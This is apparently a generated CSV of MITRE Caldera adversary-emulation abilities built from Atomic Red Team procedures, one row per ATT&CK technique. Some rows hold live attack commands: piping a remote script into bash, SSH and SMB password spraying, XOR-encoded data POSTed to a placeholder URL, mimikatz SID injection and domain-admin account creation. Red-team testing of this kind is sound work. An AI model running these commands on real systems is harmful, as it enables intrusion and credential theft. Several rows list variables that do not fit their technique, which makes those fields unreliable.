id,name,description,tactic,technique_attack_id,technique_full_name,windows_command,windows_executor,linux_command,linux_executor,darwin_command,darwin_executor,privilege,payloads,cleanup,target_dir,yml_filename,vars,has_hardcoded_abs_paths_hint
<GENERATE_UUIDv4>,Account Manipulation,Ability for Account Manipulation (ATT&CK T1098). Generated from Atomic Red Team procedures; review and test safely before use.,persistence,T1098,Account Manipulation,"$x = Get-Random -Minimum 2 -Maximum 9999 $y = Get-Random -Minimum 2 -Maximum 9999 $z = Get-Random -Minimum 2 -Maximum 9999 $w = Get-Random -Minimum 2 -Maximum 9999 Write-Host HaHa_$x$y$z $fmm = Get-LocalGroupMember -Group Administrators |?{ $_.ObjectClass -match ""User"" -and $_.PrincipalSource -match ""Local""} | Select Name foreach($member in $fmm) { if($member -like ""*Administrator*"") { $account = $member.Name.Split(""\"")[-1] # strip computername\ $originalDescription = (Get-LocalUser -Name $account).Description Set-LocalUser -Name $account -Description ""atr:$account;$originalDescription"".Substring(0,48) # Keep original name in description Rename-LocalUser -Name $account -NewName ""HaHa_$x$y$z"" # Required due to length limitation Write-Host ""Successfully Renamed $account Account on "" $Env:COM …",psh,"if [ -f ~/.ssh/authorized_keys ]; then ssh_authorized_keys=$(cat ~/.ssh/authorized_keys); echo ""$ssh_authorized_keys"" > ~/.ssh/authorized_keys; fi;",sh,"if [ -f ~/.ssh/authorized_keys ]; then ssh_authorized_keys=$(cat ~/.ssh/authorized_keys); echo ""$ssh_authorized_keys"" > ~/.ssh/authorized_keys; fi;",sh,,,,stockpile/data/abilities/persistence/,T1098__account-manipulation.yml,timeout,yes
<GENERATE_UUIDv4>,Timestomp,Ability for Timestomp (ATT&CK T1099). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1099,Timestomp,,,,,,,,,,stockpile/data/abilities/defense-evasion/,T1099__timestomp.yml,new_password;new_user_password;user_account,yes
<GENERATE_UUIDv4>,Web Shell,Ability for Web Shell (ATT&CK T1100). Generated from Atomic Red Team procedures; review and test safely before use.,persistence,T1100,Web Shell,,,,,,,,,,stockpile/data/abilities/persistence/,T1100__web-shell.yml,,no
<GENERATE_UUIDv4>,Security Support Provider,Ability for Security Support Provider (ATT&CK T1101). Generated from Atomic Red Team procedures; review and test safely before use.,persistence,T1101,Security Support Provider,,,,,,,,,,stockpile/data/abilities/persistence/,T1101__security-support-provider.yml,output_file;registry_file;sqlite3_path,yes
<GENERATE_UUIDv4>,Web Service,Ability for Web Service (ATT&CK T1102). Generated from Atomic Red Team procedures; review and test safely before use.,command-and-control,T1102,Web Service,,,,,,,,,,stockpile/data/abilities/command-and-control/,T1102__web-service.yml,mimikatz_exe;path_of_iso;ticket,no
<GENERATE_UUIDv4>,AppInit DLLs,Ability for AppInit DLLs (ATT&CK T1103). Generated from Atomic Red Team procedures; review and test safely before use.,persistence,T1103,AppInit DLLs,,,,,,,,,,stockpile/data/abilities/persistence/,T1103__appinit-dlls.yml,atomics_dir;dll_name;dll_path;file_path,yes
<GENERATE_UUIDv4>,Multi-Stage Channels,Ability for Multi-Stage Channels (ATT&CK T1104). Generated from Atomic Red Team procedures; review and test safely before use.,command-and-control,T1104,Multi-Stage Channels,,,,,,,,,,stockpile/data/abilities/command-and-control/,T1104__multi-stage-channels.yml,atomics_dir;domain_sid,yes
<GENERATE_UUIDv4>,Native API,Ability for Native API (ATT&CK T1106). Generated from Atomic Red Team procedures; review and test safely before use.,execution,T1106,Native API,"C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /out:""#{output_file}"" /target:exe ""#{source_file}"" %tmp%/T1106.exe",psh,,,,,,,,stockpile/data/abilities/execution/,T1106__native-api.yml,Destination_ID;Session_ID,yes
<GENERATE_UUIDv4>,File Deletion,Ability for File Deletion (ATT&CK T1107). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1107,File Deletion,,,,,,,,,,stockpile/data/abilities/defense-evasion/,T1107__file-deletion.yml,doh_server;domain;port;query_type;query_volume;server_ip;server_port;subdomain,no
<GENERATE_UUIDv4>,Redundant Access,Ability for Redundant Access (ATT&CK T1108). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1108,Redundant Access,,,,,,,,,,stockpile/data/abilities/defense-evasion/,T1108__redundant-access.yml,,no
<GENERATE_UUIDv4>,Component Firmware,Ability for Component Firmware (ATT&CK T1109). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1109,Component Firmware,,,,,,,,,,stockpile/data/abilities/defense-evasion/,T1109__component-firmware.yml,,no
<GENERATE_UUIDv4>,Brute Force,Ability for Brute Force (ATT&CK T1110). Generated from Atomic Red Team procedures; review and test safely before use.,credential-access,T1110,Brute Force,"echo Password1> passwords.txt echo 1q2w3e4r>> passwords.txt echo Password!>> passwords.txt echo Spring2022>> passwords.txt echo ChangeMe!>> passwords.txt @FOR /F ""delims="" %p in (passwords.txt) DO @net use %logonserver%\IPC$ /user:""%userdomain%\#{user}"" ""%p"" 1>NUL 2>&1 && @echo [*] #{user}:%p && @net use /delete %logonserver%\IPC$ > NUL",psh,"useradd -G sudo -s /bin/bash -p $(openssl passwd -1 password123) art su -c ""cd /tmp; curl -s #{remote_url} | bash"" art",sh,"cp ""$#{atomics_dir}/T1110.004/src/credstuffuserpass.txt"" /tmp/ for unamepass in $(cat /tmp/credstuffuserpass.txt);do sshpass -p `echo $unamepass | cut -d"":"" -f2` ssh -o 'StrictHostKeyChecking=no' `echo $unamepass | cut -d"":"" -f1`@#{target_host};done",sh,,,,stockpile/data/abilities/credential-access/,T1110__brute-force.yml,,no
<GENERATE_UUIDv4>,Multi-Factor Authentication Interception,Ability for Multi-Factor Authentication Interception (ATT&CK T1111). Generated from Atomic Red Team procedures; review and test safely before use.,credential-access,T1111,Multi-Factor Authentication Interception,,,,,,,,,,stockpile/data/abilities/credential-access/,T1111__multi-factor-authentication-interception.yml,,no
<GENERATE_UUIDv4>,Modify Registry,Ability for Modify Registry (ATT&CK T1112). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1112,Modify Registry,reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Explorer\Advanced /t REG_DWORD /v HideFileExt /d 1 /f,psh,,,,,,,,stockpile/data/abilities/defense-evasion/,T1112__modify-registry.yml,atomics_dir;output_file;request_timeout;target;wordlist,no
<GENERATE_UUIDv4>,Email Collection,Ability for Email Collection (ATT&CK T1114). Generated from Atomic Red Team procedures; review and test safely before use.,collection,T1114,Email Collection,"powershell -executionpolicy bypass -command ""#{file_path}\Get-Inbox.ps1"" -file #{output_file}",psh,,,,,,,,stockpile/data/abilities/collection/,T1114__email-collection.yml,,no
<GENERATE_UUIDv4>,Code Signing,Ability for Code Signing (ATT&CK T1116). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1116,Code Signing,,,,,,,,,,stockpile/data/abilities/defense-evasion/,T1116__code-signing.yml,,no
<GENERATE_UUIDv4>,Regsvr32,Ability for Regsvr32 (ATT&CK T1117). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1117,Regsvr32,,,,,,,,,,stockpile/data/abilities/defense-evasion/,T1117__regsvr32.yml,,no
<GENERATE_UUIDv4>,InstallUtil,Ability for InstallUtil (ATT&CK T1118). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1118,InstallUtil,,,,,,,,,,stockpile/data/abilities/defense-evasion/,T1118__installutil.yml,,no
<GENERATE_UUIDv4>,Regsvcs/Regasm,Ability for Regsvcs/Regasm (ATT&CK T1121). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1121,Regsvcs/Regasm,,,,,,,,,,stockpile/data/abilities/defense-evasion/,T1121__regsvcs-regasm.yml,,no
<GENERATE_UUIDv4>,Component Object Model Hijacking,Ability for Component Object Model Hijacking (ATT&CK T1122). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1122,Component Object Model Hijacking,,,,,,,,,,stockpile/data/abilities/defense-evasion/,T1122__component-object-model-hijacking.yml,,yes
<GENERATE_UUIDv4>,Audio Capture,Ability for Audio Capture (ATT&CK T1123). Generated from Atomic Red Team procedures; review and test safely before use.,collection,T1123,Audio Capture,$mic = Get-AudioDevice -Recording Set-AudioDevice -ID $mic.ID Start-Sleep -Seconds 5,psh,,,sh #{filename} #{audiofile} #{duration},sh,,,,stockpile/data/abilities/collection/,T1123__audio-capture.yml,,no
<GENERATE_UUIDv4>,Video Capture,Ability for Video Capture (ATT&CK T1125). Generated from Atomic Red Team procedures; review and test safely before use.,collection,T1125,Video Capture,reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam\NonPackaged\C:#Windows#Temp#atomic.exe /v LastUsedTimeStart /t REG_BINARY /d a273b6f07104d601 /f reg add HKLM\SOFTWARE\Microsoft\Windows\CurrentVersion\CapabilityAccessManager\ConsentStore\webcam\NonPackaged\C:#Windows#Temp#atomic.exe /v LastUsedTimeStop /t REG_BINARY /d 96ef514b7204d601 /f,psh,,,,,,,,stockpile/data/abilities/collection/,T1125__video-capture.yml,,yes
<GENERATE_UUIDv4>,Network Share Connection Removal,Ability for Network Share Connection Removal (ATT&CK T1126). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1126,Network Share Connection Removal,,,,,,,,,,stockpile/data/abilities/defense-evasion/,T1126__network-share-connection-removal.yml,,yes
<GENERATE_UUIDv4>,Trusted Developer Utilities Proxy Execution,Ability for Trusted Developer Utilities Proxy Execution (ATT&CK T1127). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1127,Trusted Developer Utilities Proxy Execution,"copy ""#{filename}"" %TEMP%\hello.js #{jscpath}\#{jscname} %TEMP%\hello.js",psh,,,,,,,,stockpile/data/abilities/defense-evasion/,T1127__trusted-developer-utilities-proxy-execution.yml,,no
<GENERATE_UUIDv4>,Netsh Helper DLL,Ability for Netsh Helper DLL (ATT&CK T1128). Generated from Atomic Red Team procedures; review and test safely before use.,persistence,T1128,Netsh Helper DLL,,,,,,,,,,stockpile/data/abilities/persistence/,T1128__netsh-helper-dll.yml,,no
<GENERATE_UUIDv4>,Shared Modules,Ability for Shared Modules (ATT&CK T1129). Generated from Atomic Red Team procedures; review and test safely before use.,execution,T1129,Shared Modules,"#{pscp_file} -pw #{vm_pass} #{vib_file} #{vm_user}@#{vm_host}:/tmp echo """" | ""#{plink_file}"" ""#{vm_host}"" -ssh -l ""#{vm_user}"" -pw ""#{vm_pass}"" -m ""#{vib_install}""",psh,,,,,,,,stockpile/data/abilities/execution/,T1129__shared-modules.yml,,no
<GENERATE_UUIDv4>,Install Root Certificate,Ability for Install Root Certificate (ATT&CK T1130). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1130,Install Root Certificate,,,,,,,,,,stockpile/data/abilities/defense-evasion/,T1130__install-root-certificate.yml,,no
<GENERATE_UUIDv4>,Authentication Package,Ability for Authentication Package (ATT&CK T1131). Generated from Atomic Red Team procedures; review and test safely before use.,persistence,T1131,Authentication Package,,,,,,,,,,stockpile/data/abilities/persistence/,T1131__authentication-package.yml,evil_image;image;script,yes
<GENERATE_UUIDv4>,Data Encoding,Ability for Data Encoding (ATT&CK T1132). Generated from Atomic Red Team procedures; review and test safely before use.,command-and-control,T1132,Data Encoding,"$plaintext = ([system.Text.Encoding]::UTF8.getBytes(""#{plaintext}"")) $key = ""#{key}"" $cyphertext = @(); for ($i = 0; $i -lt $plaintext.Count; $i++) { $cyphertext += $plaintext[$i] -bxor $key[$i % $key.Length]; } $cyphertext = [system.Text.Encoding]::UTF8.getString($cyphertext) [System.Net.ServicePointManager]::Expect100Continue = $false Invoke-WebRequest -Uri #{destination_url} -Method POST -Body $cyphertext -DisableKeepAlive",psh,echo -n 111-11-1111 | base64 curl -XPOST #{base64_data}.#{destination_url},sh,echo -n 111-11-1111 | base64 curl -XPOST #{base64_data}.#{destination_url},sh,,,,stockpile/data/abilities/command-and-control/,T1132__data-encoding.yml,,no
<GENERATE_UUIDv4>,External Remote Services,Ability for External Remote Services (ATT&CK T1133). Generated from Atomic Red Team procedures; review and test safely before use.,initial-access,T1133,External Remote Services,"$extList = #{extension_id} foreach ($extension in $extList) { New-Item -Path HKLM:\Software\Wow6432Node\Google\Chrome\Extensions\$extension -Force New-ItemProperty -Path ""HKLM:\Software\Wow6432Node\Google\Chrome\Extensions\$extension"" -Name ""update_url"" -Value ""https://clients2.google.com/service/update2/crx"" -PropertyType ""String"" -Force} Start chrome Start-Sleep -Seconds 30 Stop-Process -Name ""chrome""",psh,,,,,,,,stockpile/data/abilities/initial-access/,T1133__external-remote-services.yml,,no
<GENERATE_UUIDv4>,Access Token Manipulation,Ability for Access Token Manipulation (ATT&CK T1134). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1134,Access Token Manipulation,"#{mimikatz_path} ""privilege::debug"" ""sid::patch"" ""sid::add /sid:#{sid_to_inject} /sam:#{sam_account_name}"" ""exit""",psh,,,,,,,,stockpile/data/abilities/defense-evasion/,T1134__access-token-manipulation.yml,rootkit_name;rootkit_path,no
<GENERATE_UUIDv4>,Create Account,Ability for Create Account (ATT&CK T1136). Generated from Atomic Red Team procedures; review and test safely before use.,persistence,T1136,Create Account,"net user ""#{username}"" ""#{password}"" /add /domain net group ""#{group}"" ""#{username}"" /add /domain",psh,"echo ""dn: CN=Admin User,CN=Users,DC=#{domain},DC=#{top_level_domain}\nchangetype: add\nobjectClass: top\nobjectClass: person\nobjectClass: organizationalPerson\nobjectClass: user\ncn: Admin User\nsn: User\ngivenName: Atomic User\nuserPrincipalName: adminuser@#{domain}.#{top_level_domain}\nsAMAccountName: adminuser\nuserAccountControl: 512\nuserPassword: {CLEARTEXT}s3CureP4ssword123!\nmemberOf: CN=Domain Admins,CN=Users,DC=#{domain},DC=#{top_level_domain}"" > tempadmin.ldif echo ldapadd -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{admin_user} -w #{admin_password} -f tempadmin.ldif ldapadd -H ldap://#{domain}.#{top_level_domain}:389 -x -D #{admin_user} -w #{admin_password} -f tempadmin.ldif",sh,"dscl . -create /Users/#{username} dscl . -create /Users/#{username} UserShell /bin/zsh dscl . -create /Users/#{username} RealName ""#{realname}"" dscl . -create /Users/#{username} UniqueID ""1010"" dscl . -create /Users/#{username} PrimaryGroupID 80 dscl . -create /Users/#{username} NFSHomeDirectory /Users/#{username}",sh,,,,stockpile/data/abilities/persistence/,T1136__create-account.yml,,no
<GENERATE_UUIDv4>,Office Application Startup,Ability for Office Application Startup (ATT&CK T1137). Generated from Atomic Red Team procedures; review and test safely before use.,persistence,T1137,Office Application Startup,reg.exe add HKCU\Software\Microsoft\Office\#{outlook_version}\Outlook\WebView\#{outlook_folder} /v URL /t REG_SZ /d #{url} /f,psh,,,,,,,,stockpile/data/abilities/persistence/,T1137__office-application-startup.yml,,no
<GENERATE_UUIDv4>,Application Shimming,Ability for Application Shimming (ATT&CK T1138). Generated from Atomic Red Team procedures; review and test safely before use.,persistence,T1138,Application Shimming,,,,,,,,,,stockpile/data/abilities/persistence/,T1138__application-shimming.yml,input_file,no
<GENERATE_UUIDv4>,Bash History,Ability for Bash History (ATT&CK T1139). Generated from Atomic Red Team procedures; review and test safely before use.,credential-access,T1139,Bash History,,,,,,,,,,stockpile/data/abilities/credential-access/,T1139__bash-history.yml,,no
<GENERATE_UUIDv4>,Deobfuscate/Decode Files or Information,Ability for Deobfuscate/Decode Files or Information (ATT&CK T1140). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1140,Deobfuscate/Decode Files or Information,certutil -encode #{executable} %temp%\T1140_calc.txt certutil -decode %temp%\T1140_calc.txt %temp%\T1140_calc_decoded.exe,psh,"ENCODED=$(python3 -c 'import base64;enc=base64.b64encode(""#{message}"".encode());print(enc.decode())') python3 -c ""import base64;dec=base64.b64decode(\""$ENCODED\"");print(dec.decode())"" python3 -c ""import base64 as d;dec=d.b64decode(\""$ENCODED\"");print(dec.decode())"" python3 -c ""from base64 import b64decode;dec=b64decode(\""$ENCODED\"");print(dec.decode())"" python3 -c ""from base64 import b64decode as d;dec=d(\""$ENCODED\"");print(dec.decode())"" echo $ENCODED | python3 -c ""import base64,sys;dec=base64.b64decode(sys.stdin.read());print(dec.decode())"" echo $ENCODED > #{encoded_file} && python3 -c ""import base64;dec=base64.b64decode(open('#{encoded_file}').read());print(dec.decode())""",sh,"ENCODED=$(python3 -c 'import base64;enc=base64.b64encode(""#{message}"".encode());print(enc.decode())') python3 -c ""import base64;dec=base64.b64decode(\""$ENCODED\"");print(dec.decode())"" python3 -c ""import base64 as d;dec=d.b64decode(\""$ENCODED\"");print(dec.decode())"" python3 -c ""from base64 import b64decode;dec=b64decode(\""$ENCODED\"");print(dec.decode())"" python3 -c ""from base64 import b64decode as d;dec=d(\""$ENCODED\"");print(dec.decode())"" echo $ENCODED | python3 -c ""import base64,sys;dec=base64.b64decode(sys.stdin.read());print(dec.decode())"" echo $ENCODED > #{encoded_file} && python3 -c ""import base64;dec=base64.b64decode(open('#{encoded_file}').read());print(dec.decode())""",sh,,,,stockpile/data/abilities/defense-evasion/,T1140__deobfuscate-decode-files-or-information.yml,test_message,no
<GENERATE_UUIDv4>,Input Prompt,Ability for Input Prompt (ATT&CK T1141). Generated from Atomic Red Team procedures; review and test safely before use.,credential-access,T1141,Input Prompt,,,,,,,,,,stockpile/data/abilities/credential-access/,T1141__input-prompt.yml,,yes
<GENERATE_UUIDv4>,Keychain,Ability for Keychain (ATT&CK T1142). Generated from Atomic Red Team procedures; review and test safely before use.,credential-access,T1142,Keychain,,,,,,,,,,stockpile/data/abilities/credential-access/,T1142__keychain.yml,,no
<GENERATE_UUIDv4>,Hidden Window,Ability for Hidden Window (ATT&CK T1143). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1143,Hidden Window,,,,,,,,,,stockpile/data/abilities/defense-evasion/,T1143__hidden-window.yml,,no
<GENERATE_UUIDv4>,Gatekeeper Bypass,Ability for Gatekeeper Bypass (ATT&CK T1144). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1144,Gatekeeper Bypass,,,,,,,,,,stockpile/data/abilities/defense-evasion/,T1144__gatekeeper-bypass.yml,,yes
<GENERATE_UUIDv4>,Private Keys,Ability for Private Keys (ATT&CK T1145). Generated from Atomic Red Team procedures; review and test safely before use.,credential-access,T1145,Private Keys,,,,,,,,,,stockpile/data/abilities/credential-access/,T1145__private-keys.yml,,no
<GENERATE_UUIDv4>,Clear Command History,Ability for Clear Command History (ATT&CK T1146). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1146,Clear Command History,,,,,,,,,,stockpile/data/abilities/defense-evasion/,T1146__clear-command-history.yml,,no
<GENERATE_UUIDv4>,Hidden Users,Ability for Hidden Users (ATT&CK T1147). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1147,Hidden Users,,,,,,,,,,stockpile/data/abilities/defense-evasion/,T1147__hidden-users.yml,,no
<GENERATE_UUIDv4>,HISTCONTROL,Ability for HISTCONTROL (ATT&CK T1148). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1148,HISTCONTROL,,,,,,,,,,stockpile/data/abilities/defense-evasion/,T1148__histcontrol.yml,,no
<GENERATE_UUIDv4>,LC_MAIN Hijacking,Ability for LC_MAIN Hijacking (ATT&CK T1149). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1149,LC_MAIN Hijacking,,,,,,,,,,stockpile/data/abilities/defense-evasion/,T1149__lc-main-hijacking.yml,,no
<GENERATE_UUIDv4>,Plist Modification,Ability for Plist Modification (ATT&CK T1150). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1150,Plist Modification,,,,,,,,,,stockpile/data/abilities/defense-evasion/,T1150__plist-modification.yml,,yes
<GENERATE_UUIDv4>,Space after Filename,Ability for Space after Filename (ATT&CK T1151). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1151,Space after Filename,,,,,,,,,,stockpile/data/abilities/defense-evasion/,T1151__space-after-filename.yml,,no
<GENERATE_UUIDv4>,Launchctl,Ability for Launchctl (ATT&CK T1152). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1152,Launchctl,,,,,,,,,,stockpile/data/abilities/defense-evasion/,T1152__launchctl.yml,,no
<GENERATE_UUIDv4>,Source,Ability for Source (ATT&CK T1153). Generated from Atomic Red Team procedures; review and test safely before use.,execution,T1153,Source,,,,,,,,,,stockpile/data/abilities/execution/,T1153__source.yml,,no
<GENERATE_UUIDv4>,Trap,Ability for Trap (ATT&CK T1154). Generated from Atomic Red Team procedures; review and test safely before use.,execution,T1154,Trap,,,,,,,,,,stockpile/data/abilities/execution/,T1154__trap.yml,,no
<GENERATE_UUIDv4>,AppleScript,Ability for AppleScript (ATT&CK T1155). Generated from Atomic Red Team procedures; review and test safely before use.,execution,T1155,AppleScript,,,,,,,,,,stockpile/data/abilities/execution/,T1155__applescript.yml,,no
<GENERATE_UUIDv4>,Malicious Shell Modification,Ability for Malicious Shell Modification (ATT&CK T1156). Generated from Atomic Red Team procedures; review and test safely before use.,persistence,T1156,Malicious Shell Modification,,,,,,,,,,stockpile/data/abilities/persistence/,T1156__malicious-shell-modification.yml,,no
<GENERATE_UUIDv4>,Dylib Hijacking,Ability for Dylib Hijacking (ATT&CK T1157). Generated from Atomic Red Team procedures; review and test safely before use.,persistence,T1157,Dylib Hijacking,,,,,,,,,,stockpile/data/abilities/persistence/,T1157__dylib-hijacking.yml,,no
<GENERATE_UUIDv4>,Hidden Files and Directories,Ability for Hidden Files and Directories (ATT&CK T1158). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1158,Hidden Files and Directories,,,,,,,,,,stockpile/data/abilities/defense-evasion/,T1158__hidden-files-and-directories.yml,,no
<GENERATE_UUIDv4>,Launch Agent,Ability for Launch Agent (ATT&CK T1159). Generated from Atomic Red Team procedures; review and test safely before use.,persistence,T1159,Launch Agent,,,,,,,,,,stockpile/data/abilities/persistence/,T1159__launch-agent.yml,remote_url,yes
<GENERATE_UUIDv4>,Launch Daemon,Ability for Launch Daemon (ATT&CK T1160). Generated from Atomic Red Team procedures; review and test safely before use.,persistence,T1160,Launch Daemon,,,,,,,,,,stockpile/data/abilities/persistence/,T1160__launch-daemon.yml,,no
<GENERATE_UUIDv4>,LC_LOAD_DYLIB Addition,Ability for LC_LOAD_DYLIB Addition (ATT&CK T1161). Generated from Atomic Red Team procedures; review and test safely before use.,persistence,T1161,LC_LOAD_DYLIB Addition,,,,,,,,,,stockpile/data/abilities/persistence/,T1161__lc-load-dylib-addition.yml,,no
<GENERATE_UUIDv4>,Login Item,Ability for Login Item (ATT&CK T1162). Generated from Atomic Red Team procedures; review and test safely before use.,persistence,T1162,Login Item,,,,,,,,,,stockpile/data/abilities/persistence/,T1162__login-item.yml,,no
<GENERATE_UUIDv4>,Rc.common,Ability for Rc.common (ATT&CK T1163). Generated from Atomic Red Team procedures; review and test safely before use.,persistence,T1163,Rc.common,,,,,,,,,,stockpile/data/abilities/persistence/,T1163__rc-common.yml,,no
<GENERATE_UUIDv4>,Re-opened Applications,Ability for Re-opened Applications (ATT&CK T1164). Generated from Atomic Red Team procedures; review and test safely before use.,persistence,T1164,Re-opened Applications,,,,,,,,,,stockpile/data/abilities/persistence/,T1164__re-opened-applications.yml,,no
<GENERATE_UUIDv4>,Startup Items,Ability for Startup Items (ATT&CK T1165). Generated from Atomic Red Team procedures; review and test safely before use.,persistence,T1165,Startup Items,,,,,,,,,,stockpile/data/abilities/persistence/,T1165__startup-items.yml,base64_data;destination_url,no
<GENERATE_UUIDv4>,Setuid and Setgid,Ability for Setuid and Setgid (ATT&CK T1166). Generated from Atomic Red Team procedures; review and test safely before use.,persistence,T1166,Setuid and Setgid,,,,,,,,,,stockpile/data/abilities/persistence/,T1166__setuid-and-setgid.yml,admin_password;admin_user;domain;top_level_domain,no
<GENERATE_UUIDv4>,Securityd Memory,Ability for Securityd Memory (ATT&CK T1167). Generated from Atomic Red Team procedures; review and test safely before use.,credential-access,T1167,Securityd Memory,,,,,,,,,,stockpile/data/abilities/credential-access/,T1167__securityd-memory.yml,encoded_file;message,no
<GENERATE_UUIDv4>,Local Job Scheduling,Ability for Local Job Scheduling (ATT&CK T1168). Generated from Atomic Red Team procedures; review and test safely before use.,execution,T1168,Local Job Scheduling,,,,,,,,,,stockpile/data/abilities/execution/,T1168__local-job-scheduling.yml,,no
<GENERATE_UUIDv4>,Sudo,Ability for Sudo (ATT&CK T1169). Generated from Atomic Red Team procedures; review and test safely before use.,privilege-escalation,T1169,Sudo,,,,,,,,,,stockpile/data/abilities/privilege-escalation/,T1169__sudo.yml,,no
<GENERATE_UUIDv4>,Mshta,Ability for Mshta (ATT&CK T1170). Generated from Atomic Red Team procedures; review and test safely before use.,defense-evasion,T1170,Mshta,,,,,,,,,,stockpile/data/abilities/defense-evasion/,T1170__mshta.yml,,no
<GENERATE_UUIDv4>,LLMNR/NBT-NS Poisoning and Relay,Ability for LLMNR/NBT-NS Poisoning and Relay (ATT&CK T1171). Generated from Atomic Red Team procedures; review and test safely before use.,credential-access,T1171,LLMNR/NBT-NS Poisoning and Relay,,,,,,,,,,stockpile/data/abilities/credential-access/,T1171__llmnr-nbt-ns-poisoning-and-relay.yml,,no
<GENERATE_UUIDv4>,Domain Fronting,Ability for Domain Fronting (ATT&CK T1172). Generated from Atomic Red Team procedures; review and test safely before use.,command-and-control,T1172,Domain Fronting,,,,,,,,,,stockpile/data/abilities/command-and-control/,T1172__domain-fronting.yml,,no
<GENERATE_UUIDv4>,Dynamic Data Exchange,Ability for Dynamic Data Exchange (ATT&CK T1173). Generated from Atomic Red Team procedures; review and test safely before use.,execution,T1173,Dynamic Data Exchange,,,,,,,,,,stockpile/data/abilities/execution/,T1173__dynamic-data-exchange.yml,,no
<GENERATE_UUIDv4>,Password Filter DLL,Ability for Password Filter DLL (ATT&CK T1174). Generated from Atomic Red Team procedures; review and test safely before use.,credential-access,T1174,Password Filter DLL,,,,,,,,,,stockpile/data/abilities/credential-access/,T1174__password-filter-dll.yml,,no
<GENERATE_UUIDv4>,Component Object Model and Distributed COM,Ability for Component Object Model and Distributed COM (ATT&CK T1175). Generated from Atomic Red Team procedures; review and test safely before use.,execution,T1175,Component Object Model and Distributed COM,,,,,,,,,,stockpile/data/abilities/execution/,T1175__component-object-model-and-distributed-com.yml,,no
<GENERATE_UUIDv4>,Software Extensions,Ability for Software Extensions (ATT&CK T1176). Generated from Atomic Red Team procedures; review and test safely before use.,persistence,T1176,Software Extensions,"# Chromium $chromium = ""https://commondatastorage.googleapis.com/chromium-browser-snapshots/Win_x64/1153778/chrome-win.zip"" # uBlock Origin Lite to test side-loading $extension = ""https://github.com/uBlockOrigin/uBOL-home/releases/download/uBOLite_2024.11.25.1376/uBOLite_2024.11.25.1376.chromium.mv3.zip"" Set-Location ""#{working_dir}"" Set-Variable ProgressPreference SilentlyContinue Invoke-WebRequest -URI $chromium -OutFile ""#{working_dir}\chrome.zip"" Invoke-WebRequest -URI $extension -OutFile ""#{working_dir}\extension.zip"" Expand-Archive chrome.zip -DestinationPath ""#{working_dir}"" -Force Expand-Archive extension.zip -Force Start-Process .\chrome-win\chrome.exe --load-extension=""#{working_dir}\extension\"" -PassThru",psh,,,,,,,,stockpile/data/abilities/persistence/,T1176__software-extensions.yml,,no
<GENERATE_UUIDv4>,LSASS Driver,Ability for LSASS Driver (ATT&CK T1177). Generated from Atomic Red Team procedures; review and test safely before use.,execution,T1177,LSASS Driver,,,,,,,,,,stockpile/data/abilities/execution/,T1177__lsass-driver.yml,,no
